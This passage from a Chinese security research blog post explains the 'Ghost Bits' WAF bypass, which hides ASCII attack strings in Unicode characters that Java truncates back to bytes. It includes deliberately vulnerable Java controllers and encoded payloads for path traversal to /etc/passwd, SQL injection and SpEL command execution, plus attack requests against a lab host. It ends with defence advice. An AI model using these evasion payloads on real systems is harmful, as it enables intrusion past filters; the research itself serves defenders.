+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ghost&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">ghostRead</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullyDecoded</span> <span class="operator">=</span> GhostBitsUtil.decode(payload);</span><br><span class="line">    <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(BASE_DIR, fullyDecoded).normalize();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(path), StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="b7c45c9d-6900-40c6-89a1-8db5bf05a81c.png" alt="image"></p>
+<p><strong>幽灵 Payload 构造</strong> (<code>../../../etc/passwd</code>):</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">../  → 逮逮逯        ../  → 逮逮逯        ../  → 逮逮逯</span><br><span class="line">etc  → 遥遴遣        /    → 逯</span><br><span class="line">passwd → 遰遡遳遳遷遤</span><br><span class="line">完整 Payload: 逮逮逯逮逮逯逮逮逯遥遴遣逯遰遡遳遳遷遤</span><br></pre></td></tr></table></figure>
+<p><strong>攻击请求 :</strong></p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable/ghost?payload=/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1</span><br><span class="line">Host: 192.168.1.197:8090</span><br></pre></td></tr></table></figure>
+<p><strong>验证结果</strong>:</p>
+<p><img src="cbf0fc22-e3f7-4717-83a4-bb2eeb14fd41.png" alt="image"></p>
+<p><strong>WAF 视角对比</strong>:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未编码: ../../../etc/passwd        → WAF 检测到 ../ → 拦截 ✗</span><br><span class="line">幽灵编码: 逮逮逯逮逮逯逮逮逯遥遴遣逯遰遡遳遳遷遤  → WAF 看到汉字 → 放行 ✓</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-SQL-注入"><a href="#3-2-SQL-注入" class="headerlink" title="3.2 SQL 注入"></a>3.2 SQL 注入</h3><p><strong>漏洞代码</strong> (<code>SqlVulnerableController.java</code>):</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/sql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">sqlQuery</span><span class="params">(<span class="meta">@RequestParam</span> String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decoded</span> <span class="operator">=</span> GhostBitsUtil.decode(username);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT id, username, password, email, role FROM users WHERE username = &#x27;&quot;</span></span><br><span class="line">                + decoded + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; results;</span><br><span class="line">        <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            results = jdbc.queryForList(sql);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            results = Collections.emptyList();</span><br><span class="line">            error = e.getMessage();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="709a179e-8ecb-45a8-a857-6d530c4d27c0.png" alt="image"></p>
+<p>正常请求</p>
+<p><img src="f42ed219-4364-4de5-a776-b7a07885df04.png" alt="image"></p>
+<p>传统注入（<code>&#39; OR &#39;1&#39;=&#39;1&#39; --</code>）</p>
+<p><img src="17107edf-4e4d-4bd8-b0e4-4a9f99805cdd.png" alt="image"></p>
+<p><strong>幽灵 Payload 构造</strong> (<code>&#39; OR &#39;1&#39;=&#39;1&#39; --</code>):</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; → 逧  (空格) → 造  O → 遏  R → 遒  (空格) → 造  &#x27; → 逧</span><br><span class="line">1 → 逧  = → 逽  &#x27; → 逧  1 → 逧  &#x27; → 逧  (空格) → 造  - → 逭  - → 逭</span><br><span class="line"></span><br><span class="line">完整 Payload: 逧造遏遒造逧週逧逽逧週逧造逭逭</span><br></pre></td></tr></table></figure>
+<p><strong>攻击请求</strong>:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable/sql?username=逧造遏遒造逧週逧逽逧週逧造逭逭 HTTP/1.1</span><br><span class="line">Host: 192.168.1.197:8090</span><br></pre></td></tr></table></figure>
+<p><strong>验证结果</strong>:</p>
+<p><img src="f5bed526-b381-4532-8621-7a5442a0f902.png" alt="image"></p>
+<p><strong>WAF 视角对比</strong>:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未编码: &#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --             → WAF 检测到 SQL 关键词 → 拦截 ✗</span><br><span class="line">幽灵编码: 逧造遏遒造逧週逧逽逧週逧造逭逭  → WAF 看到汉字 → 放行 ✓</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-SpEL-表达式注入-—-RCE"><a href="#3-3-SpEL-表达式注入-—-RCE" class="headerlink" title="3.3 SpEL 表达式注入 — RCE"></a>3.3 SpEL 表达式注入 — RCE</h3><p><strong>漏洞代码</strong> (<code>SpelVulnerableController.java</code>):</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/spel&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">spelEval</span><span class="params">(<span class="meta">@RequestParam</span> String expr)</span> &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">decoded</span> <span class="operator">=</span> GhostBitsUtil.decode(expr);</span><br><span class="line"></span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">resultType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmdOutput</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">           <span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">           <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(decoded);</span><br><span class="line">           result = expression.getValue(context);</span><br></pre></td></tr></table></figure>
+<p><img src="ad8eeb2a-a053-4778-92b0-7b8e1cbdc74c.png" alt="image"></p>
+<p>传统模板注入:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（7*7）</span><br></pre></td></tr></table></figure>
+<p><img src="28d57f77-808d-4e92-9af0-62badf5a2f05.png" alt="image"></p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure>
+<p><img src="eaebfa39-c025-4eee-9bee-2648827fc21a.png" alt="image"></p>
+<p><strong>攻击请求</strong>:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable/spel?expr=達逨遪遡遶遡逮遬遡遮遧逮遒遵遮遴適遭遥逩逮遧遥遴遒遵遮遴適遭遥逨逩逮遥選遥遣逨逧適遤逧逩 HTTP/1.1</span><br><span class="line">Host: 192.168.1.197:8090</span><br></pre></td></tr></table></figure>
+<p><strong>验证结果</strong>:</p>
+<p><img src="bf67680f-26ae-42c8-a751-782662e060dd.png" alt="image"></p>
+<p><strong>WAF 视角对比</strong>:</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未编码: T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;)  → WAF 检测到 Runtime.exec → 拦截 ✗</span><br><span class="line">幽灵编码: 達逨遪遡遶遡逮遬遡遮遧逮遒遵遮遴適...     → WAF 看到汉字 → 放行 ✓</span><br></pre></td></tr></table></figure>
+<h2 id="4-工程化"><a href="#4-工程化" class="headerlink" title="4.工程化"></a>4.工程化</h2><p>这里用AI写了一个原生前端HTML文件可以在本地打开直接进行自定义的转码和解码。</p>
+<p>GitHub地址：</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Garck3h/ghostbits-tool.git</span><br></pre></td></tr></table></figure>
+<p><img src="900aac32-f629-4b7e-8e8f-e3924203f657.png" alt="image"></p>
+<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><h3 id="5-1-攻击链总结"><a href="#5-1-攻击链总结" class="headerlink" title="5.1 攻击链总结"></a>5.1 攻击链总结</h3><figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击者构造幽灵 Payload (每个 ASCII → 低8位相同的 Unicode 字符)</span><br><span class="line">        ↓</span><br><span class="line">WAF/IDS 正则匹配: 看到一堆汉字，无敏感关键词 → 放行</span><br><span class="line">        ↓</span><br><span class="line">Java 后端 char→byte 转换 (高位丢弃) → 还原原始攻击语句</span><br><span class="line">        ↓</span><br><span class="line">路径穿越 / SQL 注入 / 命令执行 → 攻击成功</span><br></pre></td></tr></table></figure>
+<h3 id="5-2-影响范围"><a href="#5-2-影响范围" class="headerlink" title="5.2 影响范围"></a>5.2 影响范围</h3><p>任何满足以下条件的 Java 应用都存在风险：</p>
+<ol>
+<li>接收用户输入（HTTP 参数、Header、Body）</li>
+<li>使用 char→byte 强转处理输入（直接或间接）</li>
+<li>后端存在可被利用的漏洞（SQL 拼接、路径拼接、表达式求值等）</li>
+</ol>
+<h3 id="5-3-防御建议"><a href="#5-3-防御建议" class="headerlink" title="5.3 防御建议"></a>5.3 防御建议</h3><table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>输入校验</strong></td>
+<td>拒绝非 ASCII 字符</td>
+<td>if (ch &gt; 127) reject — 从根源阻断幽灵比特位</td>
+</tr>
+<tr>
+<td><strong>纵深防御</strong></td>
+<td>多层校验</td>
+<td>输入校验 + 输出编码 + 最小权限</td>
+</tr>
+</tbody></table>
+<p>核心原则: <strong>永远不要信任用户输入作为安全敏感操作的参数，即使它看起来是一堆乱码汉字。</strong></p>
+<p>附：议题PPT <a target="_blank" rel="noopener" href="https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf">https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DTGdGNGXPtHc-I6DEr6Dqg">https://mp.weixin.qq.com/s/DTGdGNGXPtHc-I6DEr6Dqg</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ghost-Bits-%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Ghost Bits 绕waf原理研究分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.1.</span> <span class="toc-text">免责声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">1. 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Java-char-%E4%B8%8E-byte-%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%B7%AE%E5%BC%82"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.1 Java char 与 byte 的本质差异</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E6%9D%A5%E4%B8%80%E4%B8%AA%E7%9B%B4%E8%A7%82%E6%BC%94%E7%A4%BA%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90%E4%B8%80%E4%B8%AA-ASCII-%E5%AD%97%E7%AC%A6"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">下面来一个直观演示：一个汉字如何变成一个 ASCII 字符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">1.2 攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%BC%96%E7%A0%81%E8%A7%84%E5%88%99"><span class="toc-number">1.3.3.</span> <span class="toc-text">1.3 编码规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">2. 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%B8%BA%E4%BB%80%E4%B9%88-WAF-%E6%97%A0%E6%B3%95%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">2.1 为什么 WAF 无法检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E7%AB%AF%E4%BC%9A%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.2 为什么后端会执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Tomcat-%E7%9A%84%E9%99%90%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">2.3 Tomcat 的限制与绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-POC-%E4%B8%8E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81"><span class="toc-number">1.5.</span> <span class="toc-text">3. POC 与测试验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-%E2%80%94-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.5.1.</span> <span class="toc-text">3.1 路径穿越 — 任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text">3.2 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E2%80%94-RCE"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.3 SpEL 表达式注入 — RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%B7%A5%E7%A8%8B%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">4.工程化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">5. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.1.</span> <span class="toc-text">5.1 攻击链总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.7.2.</span> <span class="toc-text">5.2 影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.3.</span> <span class="toc-text">5.3 防御建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.8.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&text=Ghost Bits 绕waf原理研究分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&is_video=false&description=Ghost Bits 绕waf原理研究分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ghost Bits 绕waf原理研究分析&body=Check out this article: https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&name=Ghost Bits 绕waf原理研究分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&t=Ghost Bits 绕waf原理研究分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2026
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
